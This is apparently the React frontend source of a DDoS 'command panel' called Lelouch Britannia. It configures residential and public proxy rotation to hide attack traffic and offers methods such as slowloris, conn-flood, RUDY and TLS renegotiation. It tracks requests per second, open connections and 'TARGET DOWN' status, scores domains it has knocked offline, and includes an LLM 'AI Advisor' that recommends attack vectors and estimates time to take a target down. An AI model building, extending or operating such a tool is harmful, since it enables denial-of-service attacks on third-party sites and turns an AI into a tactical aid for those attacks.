                                    body: JSON.stringify({ host: resFormHost, port: parseInt(resFormPort)||8080, username: resFormUser, password: resFormPass, count: parseInt(resFormCount)||25 }),
                                  });
                                  const d = await r.json() as { status?: string; residential?: ResidentialInfo; totalProxies?: number };
                                  if (d.residential) setResidentialInfo({ ...d.residential, username: resFormUser });
                                  setResidentialCount(parseInt(resFormCount)||25);
                                  setShowResForm(false);
                                  addLog(`🏠 Residential proxies configured — ${resFormCount} slots via ${resFormHost}:${resFormPort}`, "success");
                                } catch { addLog("✕ Failed to configure residential proxies", "error"); }
                                setResSaving(false);
                              }}
                              style={{ background: "#9b59b6", border: "none", color: "#fff", borderRadius: "4px", padding: "5px 14px", cursor: "pointer", fontSize: "0.8em", opacity: resSaving ? 0.6 : 1 }}
                            >{resSaving ? "Saving..." : "💾 Save"}</button>
                            {residentialInfo && (
                              <button
                                onClick={async () => {
                                  await fetch(`${BASE}/api/proxies/pinned`, { method: "DELETE" });
                                  setResidentialInfo(null); setResidentialCount(0); setShowResForm(false);
                                  addLog("🏠 Residential proxies removed", "warn");
                                }}
                                style={{ background: "transparent", border: "1px solid rgba(192,57,43,0.5)", color: "#C0392B", borderRadius: "4px", padding: "5px 10px", cursor: "pointer", fontSize: "0.8em" }}
                              >✕ Remove</button>
                            )}
                          </div>
                        </div>
                      )}
                    </div>

                    <div className="lb-proxy-controls">
                      <button
                        className={`lb-cluster-add-btn lb-proxy-fetch-btn${proxyFetching ? " lb-proxy-fetching" : ""}`}
                        onClick={handleFetchProxies}
                        disabled={proxyFetching}
                      >
                        {proxyFetching ? "⏳ SCANNING..." : "🌐 FETCH PUBLIC PROXIES"}
                      </button>
                      {(proxies.length > 0 || residentialInfo) && (
                        <label className="lb-smart-lb-toggle">
                          <input type="checkbox" checked={proxyEnabled} onChange={e => setProxyEnabled(e.target.checked)}/>
                          <span className="lb-smart-lb-label">
                            Enable proxy rotation
                            {proxyUsable && <span style={{ color: "#2ecc71" }}> [ACTIVE for {method}]</span>}
                            {proxyEnabled && !proxyUsable && method && (
                              <span style={{ color: "#e67e22" }}> [not applicable for {method}]</span>
                            )}
                          </span>
                        </label>
                      )}
                    </div>

                    {proxies.length > 0 && (() => {
                      const httpCount   = proxies.filter(p => p.type === "http" || !p.type).length;
                      const socks5Count = proxies.filter(p => p.type === "socks5").length;
                      const avgMs       = Math.round(proxies.slice(0,20).reduce((a,p)=>a+p.responseMs,0)/Math.min(20,proxies.length));
                      return (
                        <div className="lb-proxy-list">
                          <div className="lb-proxy-header2">
                            <span className="lb-proxy-hstat">{proxies.length} <span style={{ color:"#888" }}>public</span></span>
                            <span className="lb-proxy-hstat" style={{ color: "#3498db" }}>HTTP <strong>{httpCount}</strong></span>
                            <span className="lb-proxy-hstat" style={{ color: "#9b59b6" }}>SOCKS5 <strong>{socks5Count}</strong></span>
                            <span className="lb-proxy-hstat">avg <strong>{avgMs}ms</strong></span>
                            <span className="lb-proxy-hstat">best <strong style={{ color:"#2ecc71" }}>{proxies[0]?.responseMs}ms</strong></span>
                          </div>
                          {proxies.slice(0, 6).map((p, i) => {
                            const pType = p.type ?? "http";
                            const latColor = p.responseMs < 200 ? "#2ecc71" : p.responseMs < 800 ? "#e67e22" : "#C0392B";
                            return (
                              <div key={i} className="lb-cluster-node lb-proxy-row">
                                <span className="lb-cluster-node-dot" style={{ background: latColor, boxShadow: `0 0 4px ${latColor}` }}/>
                                <span className="lb-cluster-node-url lb-proxy-host">{p.host}:{p.port}</span>
                                <span className="lb-proxy-type-badge" style={{ color: pType === "socks5" ? "#9b59b6" : "#3498db", borderColor: pType === "socks5" ? "rgba(155,89,182,0.4)" : "rgba(52,152,219,0.4)" }}>{pType.toUpperCase()}</span>
                                <span className="lb-proxy-latency" style={{ color: latColor }}>{p.responseMs}ms</span>
                              </div>
                            );
                          })}
                          {proxies.length > 6 && (
                            <div className="lb-proxy-more">+{proxies.length - 6} more in rotation pool</div>
                          )}
                        </div>
                      );
                    })()}
                  </div>
                )}
              </div>
            </div>

            {/* Stats — 4 boxes + sparklines */}
            <div className="lb-stats">
              <div className="lb-stat lb-stat--red">
                <div className="lb-stat-head">
                  <span className="lb-stat-label">{isUDP ? "Pkt/sec" : "Req/sec"}</span>
                  <span className="lb-stat-live">LIVE</span>
                </div>
                <div className="lb-stat-val">{fmtNum(pps)}</div>
                <div className="lb-stat-sub">Peak {fmtNum(peakPps)}</div>
              </div>
              {/* Active connections — only for connection-based methods */}
              {(new Set(["slowloris","conn-flood","geass-override","rudy","ws-flood","rudy-v2","tls-renego","ssl-death","keepalive-exhaust","slow-read"])).has(method) ? (
                <div className="lb-stat lb-stat--conns">
                  <div className="lb-stat-head">
                    <span className="lb-stat-label">Open Conns</span>
                    <span className="lb-stat-live" style={{ color: activeConns > 0 ? "#e74c3c" : "#555" }}>
                      {activeConns > 0 ? "HOLD" : "RAMP"}
                    </span>
                  </div>
                  <div className="lb-stat-val" style={{ color: activeConns > 1000 ? "#e74c3c" : activeConns > 200 ? "#e67e22" : "#D4AF37" }}>
                    {activeConns > 0 ? fmtNum(activeConns) : "…"}
                  </div>
                  <div className="lb-stat-sub">
                    {method === "slowloris" ? `cap ${fmtNum(Math.min(Math.floor(Math.max(400, Math.round(threads * 0.08)) / 6) * 200, 100000) * 6)}` :
                     method === "conn-flood" ? `cap ${fmtNum(Math.min(Math.floor(Math.max(400, Math.round(threads * 0.08)) / 6) * 150, 80000) * 6)}` :
                     method === "ws-flood" ? `cap ${fmtNum(Math.min(threads * 200, 40000))}` :
                     method === "geass-override" ? "35-vector conn hold" :
                     "conn hold"}
                  </div>
                </div>
              ) : (
                <div className="lb-stat lb-stat--gold">
                  <div className="lb-stat-head">
                    <span className="lb-stat-label">Bandwidth</span>
                    <span className="lb-stat-live">OUT</span>
                  </div>
                  <div className="lb-stat-val">{fmtBps(bps)}</div>
                  <div className="lb-stat-sub">Peak {fmtBps(peakBps)}</div>
                </div>
              )}
              <div className="lb-stat lb-stat--dim">
                <div className="lb-stat-head">
                  <span className="lb-stat-label">Total {isUDP ? "Pkts" : "Reqs"}</span>
                  {clusterAttackIds.length > 0 && <span className="lb-stat-live">CLUSTER</span>}
                </div>
                <div className="lb-stat-val">{fmtNum(totalPackets)}</div>
                <div className="lb-stat-sub">{fmtBytes(totalBytes)}</div>
              </div>
              <div className="lb-stat lb-stat--dim">
                <div className="lb-stat-head">
                  <span className="lb-stat-label">All Time</span>
                  <span className="lb-stat-live">DB</span>
                </div>
                <div className="lb-stat-val">{fmtNum(stats?.totalPacketsSent ?? 0)}</div>
                <div className="lb-stat-sub">{fmtBytes(stats?.totalBytesSent ?? 0)}</div>
              </div>
              {(() => {
                const displayCount = Math.max(proxyLiveCount, residentialCount);
                const isLive = displayCount > 0;
                return (
                  <div className={`lb-stat lb-stat--proxy${isLive ? " lb-stat--proxy-live" : ""}`}
                       style={{ cursor: "pointer" }} onClick={() => { setShowProxyPanel(v => !v); }}>
                    <div className="lb-stat-head">
                      <span className="lb-stat-label">Proxies</span>
                      <span className="lb-stat-live" style={{ color: (proxyIsFetching || proxyFetching) ? "#e67e22" : isLive ? "#2ecc71" : "#666" }}>
                        {(proxyIsFetching || proxyFetching) ? "SCAN" : isLive ? "LIVE" : "NONE"}
                      </span>
                    </div>
                    <div className="lb-stat-val" style={{ color: (proxyIsFetching || proxyFetching) ? "#e67e22" : isLive ? "#2ecc71" : "#888", fontSize: displayCount > 99 ? "1.4rem" : undefined }}>
                      {(proxyIsFetching || proxyFetching) ? "…" : displayCount.toLocaleString()}
                    </div>
                    <div className="lb-stat-sub">
                      {proxyIsFetching
                        ? "scanning sources…"
                        : isLive
                          ? residentialCount > 0 ? `${residentialCount.toLocaleString()} residential` : "auto-refresh 10m"
                          : "click FETCH PROXIES"}
                    </div>
                  </div>
                );
              })()}

              {/* Live RPS chart with PPS + Bandwidth */}
              {isRunning && ppsHistory.length > 1 && (
                <div className="lb-sparkline-block">
                  <div className="lb-sparkline-label">
                    <span>LIVE TRAFFIC — {method.toUpperCase()}</span>
                    <span className={`lb-method-badge lb-method-badge--${mi.cls}`}>{mi.badge}</span>
                  </div>
                  <LiveRpsChart
                    ppsData={ppsHistory}
                    bpsData={bpsHistory}
                    color={sparklineColor}
                    peakPps={peakPps}
                  />
                </div>
              )}

              {/* Latency sparkline */}
              {isRunning && latencyHistory.length > 1 && (
                <div className="lb-sparkline-block lb-sparkline-block--latency">
                  <div className="lb-sparkline-label">
                    <span>PROBE LATENCY</span>
                    <span className="lb-lat-val" style={{
                      color: latencyHistory[latencyHistory.length-1] > 2000 ? "#C0392B"
                           : latencyHistory[latencyHistory.length-1] > 800  ? "#e67e22"
                           : "#2ecc71"
                    }}>
                      {latencyHistory[latencyHistory.length-1]}ms
                    </span>
                  </div>
                  <Sparkline data={latencyHistory} color="#9b59b6" />
                </div>
              )}
            </div>

            {/* Target status banner */}
            {isRunning && targetStatus !== "unknown" && (
              <div className={`lb-target-status ${targetStatus === "offline" ? "ts-offline" : "ts-online"}`}>
                <span className="ts-dot"/>
                <span className="ts-label">
                  {targetStatus === "online"
                    ? `TARGET ONLINE — ${target} responding`
                    : `💥 TARGET DOWN — ${target} not responding`
                  }
                </span>
                <span className="ts-monitor">
                  {latencyHistory.length > 0 ? `${latencyHistory[latencyHistory.length-1]}ms probe` : "Monitoring every 6s"}
                </span>
              </div>
            )}

            {/* Multi-target status */}
            {isRunning && extraAttackIds.filter(id => id !== null).length > 0 && (
              <div className="lb-multi-status">
                <span className="lb-multi-label">⚡ MULTI-TARGET ACTIVE</span>
                {extraTargets.filter(t => t.trim()).map((et, i) => (
                  <span key={i} className="lb-multi-target">
                    <span className="lb-cluster-node-dot"/> {et} [#{extraAttackIds[i] ?? "?"}]
                  </span>
                ))}
              </div>
            )}

            {/* Progress */}
            <div className="lb-progress-wrap">
              <div className="lb-progress-label">
                <span>Attack Progress</span>
                <span style={{ display: "flex", gap: "0.6rem", alignItems: "center" }}>
                  {isRunning && timeRemaining > 0 && (
                    <span className="lb-time-remaining">{timeRemaining}s remaining</span>
                  )}
                  <span>{Math.round(progress)}%</span>
                </span>
              </div>
              <div className="lb-progress-track">
                <div className="lb-progress-fill" style={{ width: `${progress}%` }}/>
              </div>
            </div>

            {/* Terminal */}
            <div className="lb-terminal" ref={terminalRef}>
              {logs.map(l => (
                <div key={l.id} className={`lb-line lb-line--${l.type}`}>
                  <span className="lb-prompt">›</span> {highlightLog(l.text)}
                </div>
              ))}
            </div>

            {/* Site checker */}
            <section className="lb-checker">
              <h3 className="lb-section-title">👁 Site Status Checker</h3>
              <div className="lb-checker-row">
                <input
                  className="lb-input lb-checker-input"
                  type="text"
                  placeholder="URL to probe (blank = uses target above)"
                  value={checkerUrl}
                  onChange={e => setCheckerUrl(e.target.value)}
                  onKeyDown={e => e.key === "Enter" && handleCheckSite()}
                />
                <button className="lb-checker-btn" onClick={handleCheckSite} disabled={isChecking}>
                  {isChecking ? "Probing..." : "Probe"}
                </button>
              </div>
              {checkerResult && (
                <div className={`lb-checker-result ${checkerResult.up ? "cr-up" : "cr-down"}`}>
                  <span className="cr-dot" style={{ background: statusColor(checkerResult.status) }}/>
                  <span className="cr-code" style={{ color: statusColor(checkerResult.status) }}>
                    {checkerResult.status === 0 ? "OFFLINE" : `HTTP ${checkerResult.status}`}
                  </span>
                  <span className="cr-text">{checkerResult.statusText}</span>
                  <span className="cr-time">{checkerResult.responseTime}ms</span>
                  <span className={`cr-pill ${checkerResult.up ? "cr-pill-up" : "cr-pill-down"}`}>
                    {checkerResult.up ? "ONLINE" : "DOWN"}
                  </span>
                </div>
              )}
            </section>

            {/* Attack history */}
            <section className="lb-history">
              <button className="lb-history-toggle"
                onClick={() => { setShowHistory(v => !v); if (!showHistory) refetchHistory(); }}>
                👁 Attack History ({allAttacks.length}) {showHistory ? "▲" : "▼"}
              </button>
              {showHistory && (
                <>
                  {/* Local comparison chart — last 10 attacks from localStorage */}
                  {attackHistory.length > 0 && (
                    <div style={{ padding: "10px 14px", background: "rgba(0,0,0,0.25)", borderBottom: "1px solid rgba(212,175,55,0.15)" }}>
                      <div style={{ display: "flex", alignItems: "center", gap: 8, marginBottom: 8 }}>
                        <span style={{ fontSize: 11, color: "var(--color-text-muted)", fontFamily: "var(--font-mono)", textTransform: "uppercase", letterSpacing: "0.08em" }}>
                          📊 Últimos {attackHistory.length} ataques (rps)
                        </span>
                        <button
                          className="lb-cred-mini-btn"
                          style={{ marginLeft: "auto", fontSize: 10 }}
                          onClick={() => { setAttackHistory([]); localStorage.removeItem("lb-attack-history"); }}
                        >✕ Limpar</button>
                      </div>
                      <div style={{ display: "flex", alignItems: "flex-end", gap: 4, height: 60 }}>
                        {[...attackHistory].reverse().map((item, i) => {
                          const maxPps = Math.max(...attackHistory.map(a => a.pps), 1);
                          const pct = Math.max((item.pps / maxPps) * 100, 4);
                          return (
                            <div key={i} style={{ flex: 1, display: "flex", flexDirection: "column", alignItems: "center", gap: 2, minWidth: 0 }}>
                              <span style={{ fontSize: 9, color: "#D4AF37", fontFamily: "var(--font-mono)", whiteSpace: "nowrap" }}>
                                {item.pps > 999 ? `${(item.pps/1000).toFixed(1)}k` : item.pps}
                              </span>
                              <div
                                title={`${item.method} → ${item.target}\n${item.pps}/s | ${Math.round(item.bytesSent/1024)}KB | ${item.duration}s`}
                                style={{
                                  width: "100%",
                                  height: `${pct}%`,
                                  background: i === attackHistory.length - 1 ? "#2ecc71" : "#D4AF37",
                                  borderRadius: "3px 3px 0 0",
                                  opacity: 0.7 + 0.3 * (i / Math.max(attackHistory.length - 1, 1)),
                                  cursor: "pointer",
                                  transition: "opacity 0.2s",
                                }}
                              />
                              <span style={{ fontSize: 8, color: "var(--color-text-muted)", fontFamily: "var(--font-mono)", whiteSpace: "nowrap", overflow: "hidden", textOverflow: "ellipsis", maxWidth: "100%" }}>
                                {item.method.replace("-", "")}
                              </span>
                            </div>
                          );
                        })}
                      </div>
                    </div>
                  )}
                  <div className="lb-history-list">
                    {allAttacks.length === 0
                      ? <div className="lb-history-empty">No attacks on record.</div>
                      : allAttacks.map((a: { id: number; target: string; method: string; status: string; packetsSent?: number | null; bytesSent?: number | null; duration?: number | null; createdAt: string | Date; stoppedAt?: string | Date | null }) => {
                          const dur = a.stoppedAt
                            ? Math.round((new Date(a.stoppedAt).getTime() - new Date(a.createdAt).getTime()) / 1000)
                            : a.duration ?? 0;
                          const rps = dur > 0 ? Math.round((a.packetsSent ?? 0) / dur) : 0;
                          return (
                            <div key={a.id} className="lb-history-item" onClick={() => setTarget(a.target)} style={{ cursor: "pointer" }}>
                              <span className="lh-target" title={a.target}>{a.target}</span>
                              <span className="lh-method">{a.method}</span>
                              <span className={`lh-badge lhb-${a.status}`}>{a.status}</span>
                              <span className="lh-pkts">{fmtNum(a.packetsSent ?? 0)} pkts</span>
                              <span className="lh-bytes">{fmtBytes(a.bytesSent ?? 0)}</span>
                              {rps > 0 && <span className="lh-rps" style={{ color: "#D4AF37" }}>{fmtNum(rps)}/s</span>}
                            </div>
                          );
                        })
                    }
                  </div>
                </>
              )}
            </section>
          </div>
        </div>

        {/* ── Domain Score History ── */}
        {topDomains.length > 0 && (
          <div className="lb-domain-scores">
            <div className="lb-domain-scores-title">
              <span>👁 Strike Intelligence</span>
              <button className="lb-domain-scores-clear" onClick={() => {
                setDomainScores({});
                localStorage.removeItem("lb-domain-scores");
              }}>Clear</button>
            </div>
            <div className="lb-domain-scores-list">
              {topDomains.map(([domain, score]) => {
                const pct = score.total > 0 ? Math.round((score.downed / score.total) * 100) : 0;
                return (
                  <div key={domain} className="lb-domain-score-row">
                    <span className="lb-domain-score-name" title={domain}>{domain}</span>
                    <span className="lb-domain-score-method">{score.lastMethod}</span>
                    <div className="lb-domain-score-bar-wrap">
                      <div className="lb-domain-score-bar-fill" style={{ width: `${pct}%`, background: pct >= 100 ? "#2ecc71" : pct > 0 ? "#D4AF37" : "#444" }}/>
                    </div>
                    <span className={`lb-domain-score-pct ${pct >= 100 ? "lb-domain-score-pct--down" : ""}`}>
                      {pct >= 100 ? "💥 DOWN" : `${score.downed}/${score.total}`}
                    </span>
                  </div>
                );
              })}
            </div>
          </div>
        )}

        {/* ── AI Advisor Modal ── */}
        {showAiModal && (() => {
          const sev = aiData?.severity ? String(aiData.severity).toLowerCase() : null;
          const eff = aiData?.effectiveness != null ? Number(aiData.effectiveness) : null;
          const effColor = eff !== null ? (eff >= 80 ? "#e74c3c" : eff >= 60 ? "#e67e22" : "#D4AF37") : "#D4AF37";
          const sevColors: Record<string, string> = { critical: "#ff2222", high: "#e74c3c", medium: "#e67e22", low: "#2ecc71" };
          const sevColor = sev ? (sevColors[sev] ?? "#D4AF37") : "#D4AF37";
          return (
          <div className="lb-modal-overlay" onClick={() => setShowAiModal(false)}>
            <div className="lb-advisor-modal" onClick={e => e.stopPropagation()}>
              {/* Header */}
              <div className="lb-advisor-modal-hdr">
                <div className="lb-advisor-modal-title">
                  <span className={`lb-advisor-eye-icon${aiLoading ? " lb-advisor-eye-spin" : ""}`}>👁</span>
                  LELOUCH AI ADVISOR
                </div>
                <div style={{ display:"flex", gap:8, alignItems:"center" }}>
                  {sev && <span className="lb-advisor-sev-badge" style={{ background: `${sevColor}22`, border: `1px solid ${sevColor}66`, color: sevColor }}>{sev.toUpperCase()}</span>}
                  <button className="lb-modal-close" onClick={() => setShowAiModal(false)}>✕</button>
                </div>
              </div>

              {/* Body */}
              <div className="lb-advisor-modal-body">
                {aiLoading ? (
                  <div className="lb-advisor-loading">
                    <div className="lb-advisor-loading-eye">👁</div>
                    <div className="lb-advisor-loading-title">Analyzing target…</div>
                    <div className="lb-advisor-loading-sub">Consulting Groq llama-3.3-70b · probing latency & headers</div>
                    <div className="lb-advisor-loading-dots"><span/><span/><span/></div>
                  </div>
                ) : aiError ? (
                  <div className="lb-advisor-error">
                    <div className="lb-advisor-error-icon">⚠</div>
                    <div className="lb-advisor-error-msg">{aiError}</div>
                    <div className="lb-advisor-error-hint">Check target URL format and API connectivity.</div>
                  </div>
                ) : aiData ? (
                  <div className="lb-advisor-content">
                    {/* Effectiveness bar */}
                    {eff !== null && (
                      <div className="lb-advisor-eff-wrap">
                        <div className="lb-advisor-eff-row">
                          <span className="lb-advisor-eff-lbl">EFFECTIVENESS</span>
                          <span className="lb-advisor-eff-pct" style={{ color: effColor }}>{String(eff)}%</span>
                        </div>
                        <div className="lb-advisor-eff-track">
                          <div className="lb-advisor-eff-fill" style={{ width:`${eff}%`, background: effColor, boxShadow:`0 0 8px ${effColor}88` }}/>
                        </div>
                      </div>
                    )}

                    {/* Analysis */}
                    {Boolean(aiData.analysis) && (
                      <div className="lb-advisor-card">
                        <div className="lb-advisor-card-label">ANALYSIS</div>
                        <div className="lb-advisor-card-text">{String(aiData.analysis)}</div>
                      </div>
                    )}

                    {/* Recommendation */}
                    {Boolean(aiData.primaryRecommendation) && (
                      <div className="lb-advisor-card lb-advisor-card--rec">
                        <div className="lb-advisor-card-label">RECOMMENDATION</div>
                        <div className="lb-advisor-card-text">{String(aiData.primaryRecommendation)}</div>
                      </div>
                    )}

                    {/* Vectors row */}
                    <div className="lb-advisor-vectors-row">
                      {Boolean(aiData.boostVector) && (
                        <div className="lb-advisor-vec lb-advisor-vec--boost">
                          <span className="lb-advisor-vec-lbl">⚡ BOOST VECTOR</span>
                          <span className="lb-advisor-vec-method">{String(aiData.boostVector).toUpperCase()}</span>
                        </div>
                      )}
                      {Boolean(aiData.reduceVector) && String(aiData.reduceVector) !== "null" && (
                        <div className="lb-advisor-vec lb-advisor-vec--reduce">
                          <span className="lb-advisor-vec-lbl">↓ REDUCE</span>
                          <span className="lb-advisor-vec-method" style={{ color:"#e67e22" }}>{String(aiData.reduceVector)}</span>
                        </div>
                      )}
                      {Boolean(aiData.estimatedDownIn) && (
                        <div className="lb-advisor-vec lb-advisor-vec--est">
                          <span className="lb-advisor-vec-lbl">⏱ EST. DOWN IN</span>
                          <span className="lb-advisor-vec-method" style={{ color:"#D4AF37" }}>{String(aiData.estimatedDownIn)}</span>
                        </div>
                      )}
                    </div>

                    {/* Tip */}
                    {Boolean(aiData.tip) && (
                      <div className="lb-advisor-card lb-advisor-card--tip">
                        <div className="lb-advisor-card-label">⚔ TACTICAL TIP</div>
                        <div className="lb-advisor-card-text lb-advisor-tip">{String(aiData.tip)}</div>
                      </div>
                    )}

                    {/* Target status */}
                    {Boolean(aiData.targetStatus) && (
                      <div className="lb-advisor-target-row">
                        <span className="lb-advisor-ts-dot" style={{ background: String(aiData.targetStatus).startsWith("2") ? "#2ecc71" : "#e74c3c" }}/>
                        <span className="lb-advisor-ts-code">HTTP {String(aiData.targetStatus)}</span>
                        {aiData.latencyMs != null && <span className="lb-advisor-ts-lat">{String(aiData.latencyMs)}ms probe</span>}
                      </div>
                    )}
                  </div>
                ) : (
                  <div className="lb-advisor-empty">No recommendation yet.</div>
                )}
              </div>

              {/* Footer */}
              {!aiLoading && (
                <div className="lb-advisor-modal-ftr">
                  {Boolean(aiData?.boostVector) && methods.some(m => m.id === String(aiData!.boostVector)) && (
                    <button className="lb-advisor-apply-btn" onClick={() => {
                      setMethod(String(aiData!.boostVector));
                      addLog(`👁 Applied boost vector: ${String(aiData!.boostVector).toUpperCase()}`, "success");
                      setShowAiModal(false);
                    }}>
                      ⚡ APPLY {String(aiData!.boostVector).toUpperCase()}
                    </button>
                  )}
                  <button className="lb-advisor-refresh-btn" onClick={handleAiAdvisor}>↺ REFRESH</button>
                  <button className="lb-advisor-close-btn" onClick={() => setShowAiModal(false)}>CLOSE</button>
                </div>
              )}
            </div>
          </div>
          );
        })()}

        <footer className="lb-footer">
          <img src={GEASS_SYMBOL} className="lb-footer-symbol" alt=""/>
          <span>v3.0 — Lelouch Britannia Command Panel</span>
          <span className="lb-footer-credit">Made by blxckxyz</span>
          <img src={GEASS_SYMBOL} className="lb-footer-symbol" alt="" aria-hidden="true"/>
        </footer>
        <div className="lb-footer-bar"><div className="lb-footer-fill" style={{ width: `${progress}%` }}/></div>

        </> /* end activePage === "attack" */}

      </div>

      {/* Mobile FAB — only visible on attack tab */}
      {activePage === "attack" && (
        <button
          className={`lb-fab ${isRunning ? "lb-fab--stop" : ""}`}
          onClick={handleLaunch}
          aria-label={isRunning ? "Abort Geass" : "Command Geass"}
        >
          <img src={GEASS_SYMBOL} className="lb-fab-glyph-img" alt=""/>
          <span className="lb-fab-label">{isRunning ? "ABORT" : "GEASS"}</span>
        </button>
      )}
    </div>
  );
}

export default function App() {
  return (
    <QueryClientProvider client={queryClient}>
      <Panel />
    </QueryClientProvider>
  );
}
